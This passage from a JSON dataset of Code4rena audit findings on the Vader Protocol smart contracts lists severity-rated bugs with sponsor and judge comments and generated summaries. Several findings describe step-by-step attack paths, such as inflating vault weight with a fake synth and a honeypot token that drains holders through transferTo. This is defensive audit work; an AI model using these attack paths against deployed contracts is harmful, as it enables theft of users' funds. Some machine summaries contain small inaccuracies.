      "summary": "\nThis bug report is about the ability to cancel finalized proposals in a system. The vulnerability is that when a proposal is passed the threshold and finalized, it can still be cancelled by a minority using the `cancelProposal` function. However, this function only sets the `mapPID_votes` to zero, but does not change the `mapPID_timeStart` and `mapPID_finalising` values, meaning that the proposal still passes the checks in `finaliseProposal` and is then queued for execution. As a result, proposals cannot be cancelled. The recommended mitigation step is to set a cancel flag and check for it in both `finaliseProposal` and in the execution process.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/228",
      "tags": [],
      "finders": []
    },
    {
      "id": "3932",
      "title": "[M-05] Interest debt is capped after a year",
      "impact": "MEDIUM",
      "content": "\nThe `Utils.getInterestOwed` function computes the `_interestPayment` as:\n\n```solidity\nuint256 _interestPayment =\n  calcShare(\n      timeElapsed,\n      _year,\n      getInterestPayment(collateralAsset, debtAsset)\n  ); // Share of the payment over 1 year\n```\n\nHowever, `calcShare` caps `timeElpased` to `_year` and therefore the owed interest does not grow after a year has elapsed.\n\nThe impact is probably small because the only call so far computes the elapsed time as `block.timestamp - mapCollateralAsset_NextEra[collateralAsset][debtAsset];` which most likely will never go beyond a year.\n\nIt's still recommended to fix the logic bug in case more functions will be added that use the broken function.\n\nRecommend using a different function than `calcShare` that does not cap.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/219#issuecomment-830616264):**\n > A member who doesn't interact with the contract for more than a year misses out on some rewards, so severity:1\n\n",
      "summary": "\nA bug has been found in the `Utils.getInterestOwed` function of a Solidity smart contract. This function computes the _interestPayment as a share of the payment over 1 year, but the `calcShare` function used caps the timeElapsed to _year, meaning that the owed interest does not grow after a year has elapsed. \n\nThe impact of this bug is likely to be small as the only call so far computes the elapsed time as `block.timestamp - mapCollateralAsset_NextEra[collateralAsset][debtAsset]`, which is unlikely to go beyond a year. However, it is still recommended to fix the logic bug in case more functions are added that use the broken function.\n\nThe recommended mitigation step is to use a different function than `calcShare` that does not cap.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/219",
      "tags": [],
      "finders": []
    },
    {
      "id": "3931",
      "title": "[M-04] flashProof is not flash-proof",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `flashProof` modifier is supposed to prevent flash-loan attacks by disallowing performing several sensitive functions in the same block.\n\nHowever, it performs this check on `tx.origin` and not on an individual user address basis.\nThis only prevents flash loan attacks from happening within a single transaction.\n\nBut flash loan attacks are theoretically not limited to the same transaction but to the same block as miners have full control of the block and include several vulnerable transactions back to back. (Think transaction _bundles_ similar to flashbot bundles that most mining pools currently offer.)\n\nA miner can deploy a proxy smart contract relaying all contract calls and call it from a different EOA each time bypassing the `tx.origin` restriction.\n\n## Impact\n\nThe `flashProof` modifier does not serve its purpose.\n\n## Recommended Mitigation Steps\n\nTry to apply the modifier to individual addresses that interact with the protocol instead of `tx.origin`.\n\nFurthermore, attacks possible with flash loans are usually also possible for whales, making it debatable if adding flash-loan prevention logic is a good practice.",
      "summary": "\nThe 'flashProof' modifier is a tool meant to prevent flash-loan attacks by disallowing certain sensitive functions to be performed in the same block. However, it only prevents flash loan attacks from happening within a single transaction, as it checks the `tx.origin` and not an individual user address. This means that miners are able to deploy a proxy smart contract relaying all contract calls and call it from a different EOA each time, thus bypassing the `tx.origin` restriction. \n\nThe impact of this vulnerability is that the 'flashProof' modifier does not serve its purpose. To mitigate this vulnerability, it is recommended to apply the modifier to individual addresses that interact with the protocol instead of `tx.origin`. Additionally, it should be noted that attacks possible with flash loans are usually also possible for whales, making it debatable if adding flash-loan prevention logic is a good practice.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/218",
      "tags": [],
      "finders": []
    },
    {
      "id": "3930",
      "title": "[M-03] Lack of input validation in replacePool() allows curated pool limit bypass in Router.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThere is no input validation in replacePool() function to check if oldToken exists and is curated. Using a non-existing oldToken (even 0 address) passes the check on L236 (because Pools.getBaseAmount() will return 0 for the non-existing token) and newToken will be made curated. This can be used to bypass the curatedPoolLimit enforced only in curatePool() function.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L234-L241\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L227-L229\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L227\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nCheck if oldToken exists and is curated as part of input validation in replacePool() function.",
      "summary": "\nA bug has been reported in the Router.sol and Pools.sol contracts of the Vader Protocol. The bug is related to the replacePool() function, which does not have any input validation to check if the oldToken exists and is curated. This means that a non-existing oldToken (even 0 address) can be used to bypass the curatedPoolLimit enforced only in curatePool() function. The bug can be exploited by manually analyzing the code. To mitigate this issue, it is recommended to add input validation to the replacePool() function to check if the oldToken exists and is curated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/87",
      "tags": [],
      "finders": []
    },
    {
      "id": "3929",
      "title": "[M-02] Undefined behavior for DAO and GRANT vote proposals in DAO.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nGiven that there are only three proposal types (GRANT, UTILS, REWARD) that are actionable, it is unclear if 'DAO' type checked in voteProposal() is a typographical error and should really be 'GRANT'. Otherwise, GRANT proposals will only require quorum (33%) and not majority (50%).\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/DAO.sol#L79-L92\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nChange ‘DAO’ on L83 to ‘GRANT’ or if not, specify what DAO proposals are and how GRANT proposals should be handled with quorum or majority.\n\nAlso, check and enforce that mapPID_types are only these three actionable proposal types: GRANT, UTILS, REWARD.",
      "summary": "\nThis bug report is about a vulnerability in the DAO.sol contract. The issue is that there are three proposal types (GRANT, UTILS, REWARD) that are actionable, but it is unclear if the 'DAO' type checked in voteProposal() is a typographical error and should really be 'GRANT'. If it is not, GRANT proposals will only require quorum (33%) and not majority (50%). The bug was found through manual analysis and the proof of concept can be found in the link provided. The recommended mitigation steps are to change ‘DAO’ on L83 to ‘GRANT’ or if not, specify what DAO proposals are and how GRANT proposals should be handled with quorum or majority. Additionally, the mapPID_types should be checked and enforced to only include the three actionable proposal types.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/183",
      "tags": [],
      "finders": []
    },
    {
      "id": "3928",
      "title": "[M-01] User may not get IL protection if certain functions are called directly in Pools.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nFunctions removeLiquidity() and removeLiquidityDirectly() when called directly, do not provide the the user with IL protection unlike when calling the corresponding removeLiquidity() function in Router.sol. This should be prevented, at least for removeLiquidity() or highlighted in the specification and user documentation.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L77-L82\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L113-L118\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd access control (e.g. via a modifier onlyRouter) so removeLiquidity() function of Pools contract can be called only from corresponding Router contract’s removeLiquidity() function which provides IL protection. Alternatively, highlight in the specification and user documentation about which contract interfaces provide IL protection to users.",
      "summary": "\nThis bug report is about a vulnerability in the Vader Protocol, a decentralized finance protocol. The vulnerability affects the functions removeLiquidity() and removeLiquidityDirectly() of the Pools contract. When called directly, these functions do not provide the user with IL protection, unlike when calling the corresponding removeLiquidity() function in Router.sol. This can be dangerous for users, as it leaves them unprotected from potential losses. \n\nProof of concept for the vulnerability can be found in the GitHub repositories given in the report. The bug was found using manual analysis. The recommended mitigation steps are to add access control (e.g. via a modifier onlyRouter) so removeLiquidity() function of Pools contract can be called only from corresponding Router contract’s removeLiquidity() function which provides IL protection. Alternatively, the specification and user documentation should be updated to highlight which contract interfaces provide IL protection to users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/120",
      "tags": [],
      "finders": []
    },
    {
      "id": "3927",
      "title": "[H-25] Incorrect initialization causes VADER emission rate of 1 second instead of 1 day in Vader.sol",
      "impact": "HIGH",
      "content": "\nIncorrect initialization (perhaps testing parameterization mistakenly carried over to deployment) of `secondsPerEra` to 1 sec instead of 86400 secs (1 day) causes what should be the daily emission rate to be a secondly emission rate.\n\nThis causes inflation of VADER token and likely breaks VADER<>USDV peg and other protocol invariants. Protocol will break and funds will be lost.\n\nRecommend Initializing `secondsPerEra` to 86400 on L67.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/155#issuecomment-830606416):**\n > This is purely for testing purposes.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the VADER token system. The vulnerability is caused by an incorrect initialization of the parameter 'secondsPerEra' to 1 second instead of 86400 seconds (1 day). This causes an inflation of the VADER token and likely breaks the VADER<>USDV peg and other protocol invariants. If left unaddressed, the protocol will break and funds may be lost.\n\nThe vulnerability can be found in the following lines of code on GitHub: Line 67, line 68, and lines 204 to 214. Manual analysis was used to identify the issue.\n\nThe recommended mitigation step is to initialize the 'secondsPerEra' parameter to 86400 on line 67.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/155",
      "tags": [],
      "finders": []
    },
    {
      "id": "3926",
      "title": "[H-23] Anyone can curate pools and steal rewards",
      "impact": "HIGH",
      "content": "\nThe `Router.curatePool` and `replacePool` don't have any access restriction.\nAn attacker can get a flash loan of base tokens and replace existing curated pools with their own curated pools.\n\nCurated pools determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.\nThey can then go ahead and game the reward system by repeatedly swapping in their custom pool with useless tokens, withdraw liquidity, and in the end, pay back the base flashloan.\n\nRecommend preventing the replacing of curations through flash loans. Also, consider making pool curations DAO-exclusive actions.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/210#issuecomment-828473380):**\n > Slip-based pools cannot be attacked with flash loans.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/210#issuecomment-849131582):**\n > Further comment from @cmichelio:\n>\n> I can curate my custom token using `curatePool` without using a flashloan or using replacePool by temporarily providing liquidity to the pool without trading in it and getting slip-fee'd. I'm not trading in the pool, and don't think providing/removing liquidity comes with a fee. I think this is still an issue.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Router.curatePool and replacePool functions. These functions do not have any access restriction, which makes it possible for an attacker to get a flash loan of base tokens and replace existing curated pools with their own curated pools. This can be used to manipulate the rewards system, as the attacker can remove rewards from a curated pool and add rewards to their own pool with a custom token they control. To mitigate this vulnerability, it is recommended to prevent replacing curations through flash loans and consider making pool curations DAO-exclusive actions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/210",
      "tags": [],
      "finders": []
    },
    {
      "id": "3925",
      "title": "[H-22] Users may unintentionally remove liquidity under a phishing attack.",
      "impact": "HIGH",
      "content": "The `removeLiquidity` function in `Pools.sol` uses `tx.origin` to determine the person who wants to remove liquidity. However, such a design is dangerous since the pool assumes that this function is called from the router, which may not be true if the user is under a phishing attack, and he could unintentionally remove liquidity.\n\nReferenced code: [Pool.sol#L77-L79](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L77-L79)\n\nRecommend consider making the function `_removeLiquidity` external, which can be utilized by the router, providing information of which person removes his liquidity.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/316#issuecomment-830571343):**\n > If a user has been phished, consider all their funds already stolen.\n\n> Vader's security assumption is a user is not phished.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/316#issuecomment-830578243):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 0\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/316#issuecomment-849061196):**\n > This is reasonably easy to mitigate as an issue and failure to do so does leave an attack vector open. If exploited it will result in a loss of user funds.\n\n",
      "summary": "\nThis bug report concerns the `removeLiquidity` function in the `Pools.sol` code. This function uses `tx.origin` to determine the person who wants to remove liquidity. This design is dangerous, as it assumes that this function is called from the router, which may not be true if the user is under a phishing attack, and could unintendedly remove liquidity. To mitigate this risk, it is recommended to make the function `_removeLiquidity` external, which can be utilized by the router, providing information of which person removes his liquidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/316",
      "tags": [],
      "finders": []
    },
    {
      "id": "3924",
      "title": "[H-21] Anyone Can Avoid All Vether Transfer Fees By Adding Their Address to the Vether ExcludedAddresses List.",
      "impact": "HIGH",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\n## Impact\n\nAnyone Can Avoid All Vether Transfer Fees By Adding Their Address to the Vether ExcludedAddresses List.\n\nVether.sol implements a fee on every token transfer, unless either the sender or the recipient exists on a list of excluded addresses (mapAddress_Excluded).\nHowever, the addExcluded() function in Vether.sol has no restrictions on who can call it.\nSo any user can call addExcluded with their own address as the argument, and bypass all transfer fees.\n\n## Proof of Concept\n\nAlice calls:\n\n(1) Vether.addExcluded(aliceAddress), which adds Alice's address to mapAddress_Excluded.\n(2) Alice can now freely transfer Vether with no fees.\n\n## Recommended Mitigation Steps\n\nAdd restrictions to who can call addExcluded, perhaps by restricting it to a caller set by DAO.sol",
      "summary": "\nThis bug report is about a vulnerability in the Vether smart contract. It allows anyone to add their address to the Vether ExcludedAddresses List, which allows them to avoid all Vether transfer fees. The Proof of Concept section demonstrates how Alice can call the addExcluded() function with her own address as the argument, allowing her to freely transfer Vether with no fees. The Recommended Mitigation Steps section suggests adding restrictions to who can call addExcluded, such as restricting it to a caller set by DAO.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/189",
      "tags": [],
      "finders": []
    },
    {
      "id": "3923",
      "title": "[H-20] Vault Weight accounting is wrong for withdrawals",
      "impact": "HIGH",
      "content": "\n\nWhen depositing two different synths, their weight is added to the same `mapMember_weight[_member]` storage variable.\nWhen withdrawing the full amount of one synth with `_processWithdraw(synth, member, basisPoints=10000` the full weight is decreased.\n\nThe second deposited synth is now essentially weightless.\n\nUsers that deposited more than one synth can not claim their fair share of rewards after a withdrawal.\n\nRecommed that the weight should be indexed by the synth as well.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/224#issuecomment-828457510):**\n > This is valid.\n>\n> The weight should be reduced only as applied to a specific synth\n>\n> There is no loss of funds, just less rewards for that member, disputing severity level.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/224#issuecomment-830578796):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 2\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/224#issuecomment-849037439):**\n > My viewpoint on this and the last several reward based high risk issues is that loss of rewards is loss of funds. High risk is appropriate.\n\n\n",
      "summary": "\nThis bug report is about an issue with the deposit and withdrawal of two different synths. When depositing two different synths, their weight is added to the same `mapMember_weight[_member]` storage variable. When withdrawing the full amount of one synth, the full weight is decreased, leaving the second deposited synth essentially weightless. This means that users that deposited more than one synth cannot claim their fair share of rewards after a withdrawal. The recommended mitigation step is to index the weight by the synth as well.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/224",
      "tags": [],
      "finders": []
    },
    {
      "id": "3922",
      "title": "[H-19] Vault rewards last claim time not always initialized",
      "impact": "HIGH",
      "content": "\nThe `harvest` calls `calcCurrentReward` which computes `_secondsSinceClaim = block.timestamp - mapMemberSynth_lastTime[member][synth];`.  As one can claim different synths than the synths that they deposited, `mapMemberSynth_lastTime[member][synth]` might still be uninitialized and the `_secondsSinceClaim` becomes the current block timestamp.\n\nThe larger the `_secondsSinceClaim` the larger the rewards.\nThis bug allows claiming a huge chunk of the rewards.\n\nRecommend letting users only harvest synths that they deposited.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/223#issuecomment-828461277):**\n > This is valid.\n>\n> The member should only claim against synths they have deposited, where the time would be initialised.\n>\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/223#issuecomment-830635006):**\n > Would place this as severity: 2, since the anyone can participate in claiming rewards, but no extra inflation occurs.\n\n\n",
      "summary": "\nA bug has been reported in the `harvest` function of a system. The bug allows users to claim larger rewards than usual by claiming different synths than the ones they deposited. This is because the `mapMemberSynth_lastTime[member][synth]` variable is uninitialized, and the `_secondsSinceClaim` becomes the current block timestamp. This results in a larger reward for the user. To mitigate this issue, it is recommended that users only be allowed to harvest synths that they have deposited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/223",
      "tags": [],
      "finders": []
    },
    {
      "id": "3921",
      "title": "[H-18]  Vault rewards can be gamed",
      "impact": "HIGH",
      "content": "\nThe `_deposit` function increases the member's _weight_ by `_weight = iUTILS(UTILS()).calcValueInBase(iSYNTH(_synth).TOKEN(), _amount);` which is the swap output amount when trading the deposited underlying synth amount.\n\nNotice that anyone can create synths of custom tokens by calling `Pools.deploySynth(customToken)`.\n\nTherefore an attacker can deposit valueless custom tokens and inflate their member weight as follows:\n\n1. Create a custom token and issue lots of tokens to the attacker\n2. Create synth of this token\n3. Add liquidity for the `TOKEN <> BASE` pair by providing a single wei of `TOKEN` and `10^18` BASE tokens. This makes the `TOKEN` price very expensive.\n4. Mint some synths by paying BASE to the pool\n5. Deposit the fake synth, `_weight` will be very high because the token pool price is so high.\n\nCall `harvest(realSynth)` with a synth with actual value. This will increase the synth balance and it can be withdrawn later.\n\nAnyone can inflate their member weight through depositing a custom synth and earn almost all vault rewards by calling `harvest(realSynth)` with a valuable \"real\" synth.\nThe rewards are distributed pro rata to the member weight which is independent of the actual synth deposited.\n\nThe `calcReward` function completely disregards the `synth` parameter which seems odd.\nRecommend thinking about making the rewards based on the actual synths deposited instead of a \"global\" weight tracker.\nAlternatively, whitelist certain synths that count toward the weight, or don't let anyone create synths.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/222#issuecomment-828453323):**\n > This is a valid attack path.\n>\n> The counter is two fold:\n>\n> 1) In the vault, `require(isCurated(token))` this will only allow synths of curated tokens to be deposited for rewards. [The curation logic ](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L234) does a check for liquidity depth, so only deep pools can become synths. Thus an attacker would need to deposit a lot of BASE.\n>\n> 2) In the vaults, use `_weight = iUTILS(UTILS()).calcSwapValueInBase(iSYNTH(_synth).TOKEN(), _amount);`, which computes the weight with respect to slip, so a small manipulated pool cannot be eligible. The pool would need to be deep.\n>\n> ---\n>\n> The Vault converts all synths back to common accounting asset - USDV, so member weight can be tracked.\n>\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/222#issuecomment-830635200):**\n > Disagree with severity, since the daily rewards can be claimed by anyone in a fee-bidding war but no actual extra inflation occurs.\n>\n> Severity: 2\n\n",
      "summary": "\nThis bug report is about the _deposit_ function in a codebase which can be exploited to inflate a member's weight. This is done by creating a custom token, issuing lots of tokens to the attacker, creating a synth of this token, adding liquidity to the token-base pair, minting some synths, and then depositing the fake synth. The attacker can then call the `harvest(realSynth)` function with a valuable synth to increase their synth balance and withdraw it later. This results in the attacker earning almost all vault rewards, as they are distributed pro rata to the member weight which is independent of the actual synth deposited.\n\nThe recommended mitigation steps are to make the rewards based on the actual synths deposited instead of a \"global\" weight tracker, whitelist certain synths, or don't let anyone create synths.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/222",
      "tags": [],
      "finders": []
    },
    {
      "id": "3920",
      "title": "[H-17] Transfer fee is burned on wrong accounts",
      "impact": "HIGH",
      "content": "\nThe `Vader._transfer` function burns the transfer fee on `msg.sender` but this address might not be involved in the transfer at all due to `transferFrom`.\n\nSmart contracts that simply relay transfers like aggregators have their Vader balance burned or the transaction fails because these accounts don't have any balance to burn, breaking the functionality.\n\nRecommend that It should first increase the balance of `recipient` by the full amount and then burn the fee on the `recipient`.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/220#issuecomment-828463080):**\n > For composabilty with the rest of the ecosystem, this should be addressed, although disagree with the severity, no funds are lost, just the aggregrator cannot transfer unless they first transfer to themselves, which most often do.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/220#issuecomment-830582199):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 2\n\n",
      "summary": "\nThis bug report is about an issue with the `Vader._transfer` function in a smart contract. The function is meant to burn a transfer fee on the `msg.sender` address, but this address may not be involved in the transfer at all if the transfer is done using `transferFrom`. This can cause problems for smart contracts that simply relay transfers like aggregators, as their Vader balance will be burned or the transaction will fail because these accounts don't have any balance to burn, breaking the functionality. The recommended mitigation step to solve this issue is to increase the balance of the recipient by the full amount before burning the fee on the recipient.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/220",
      "tags": [],
      "finders": []
    },
    {
      "id": "3919",
      "title": "[H-16] Tokens can be stolen through transferTo",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nI know that it's stated that:\n\n> VADER, USDV, SYNTHS all employ the `transferTo()` function, which interrogates for `tx.origin` and skips approvals. The author does not subscribe to the belief that this is dangerous\n\nIn my opinion, it can be very dangerous. Imagine the following scenario:\n\n1. I create a custom attacker ERC20 token that has a hook in the `_transfer` function that checks tx.origin for USDV/VADER/SYNTHS and calls `transferTo` to steal these funds.\n2. I set up a honeypot by providing liquidity to the `BASE <> ATTACKER` pool.\n3. I target high-profile accounts holdinging VADER/USDV/SYNTHS and airdrop them free tokens.\n4. Block explorers / Vader swap websites could show that this token has value and can be traded for actual `BASE` tokens.\n5. User wants to sell the airdropped `ATTACKER` token to receive valuable tokens through the Vader swap and has all their tokens (that are even completely unrelated to the tokens being swapped) stolen.\n\n## Impact\n\nIn general, a holder of any of the core assets of the protocol risks all their funds being stolen if they ever interact with an unvetted external contract/token.\nThis could even be completely unrelated to the VADER protocol.\n\n## Recommended Mitigation Steps\n\nRemove `transferTo` and use `permit` + `transferFrom` instead to move tokens from `tx.origin`.",
      "summary": "\nThis bug report is about the risk of using the `transferTo()` function in the VADER, USDV, and SYNTHS protocols. The author does not believe it is dangerous, however, the reporter believes it can be very dangerous. The reporter outlines a scenario where an attacker creates a custom token, sets up a honeypot, and airdrops the token to high-profile accounts holding VADER/USDV/SYNTHS. If the user then tries to sell the airdropped token, they can have all their tokens, even those unrelated to the tokens being swapped, stolen. The reporter believes that holders of any of the core assets of the protocol risk all their funds being stolen if they ever interact with an unvetted external contract/token. The recommended mitigation step is to remove `transferTo` and use `permit` + `transferFrom` instead to move tokens from `tx.origin`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/217",
      "tags": [],
      "finders": []
    },
    {
      "id": "3918",
      "title": "[H-15] Wrong slippage protection on Token -> Token trades",
      "impact": "HIGH",
      "content": "The `Router.swapWithSynthsWithLimit` allows trading token to token and specifying slippage protection. A token to token trade consists of two trades:\n\n1. token to base\n2. base to token\n\nThe slippage protection of the second trade (base to token) is computed wrong:\n\n```solidity\nrequire(iUTILS(UTILS()).calcSwapSlip(\n    inputAmount, // should use outToken here from prev trade\n    iPOOLS(POOLS).getBaseAmount(outputToken)\n  ) <= slipLimit\n);\n```\n\nIt compares the **token** input amount (of the first trade) to the **base** reserve of the second pair.\n\nSlippage protection fails and either the trade is cancelled when it shouldn't be or it is accepted even though the user suffered more losses than expected.\n\nRecommend it should use the base output from the first trade to check for slippage protection. Note that this still just computes the slippage protection of each trade individually. An even better way would be to come up with a formula to compute the slippage on the two trades at once.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/209#issuecomment-828476313):**\n > Valid, although disagree with severity, the wrongly compute slip amount would just fail the trade or allow the second trade to go thru with no protection.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/209#issuecomment-830580592):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 1\n\n",
      "summary": "\nThis bug report is about the `Router.swapWithSynthsWithLimit` function, which allows trading token to token with slippage protection. The slippage protection of the second trade (base to token) is computed wrong, comparing the token input amount (of the first trade) to the base reserve of the second pair. This means that the slippage protection fails and either the trade is cancelled when it shouldn't be or it is accepted even though the user suffered more losses than expected. To fix the issue, the base output from the first trade should be used to check for slippage protection. Additionally, a formula to compute the slippage on the two trades at once could be implemented for better protection.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/209",
      "tags": [],
      "finders": []
    },
    {
      "id": "3917",
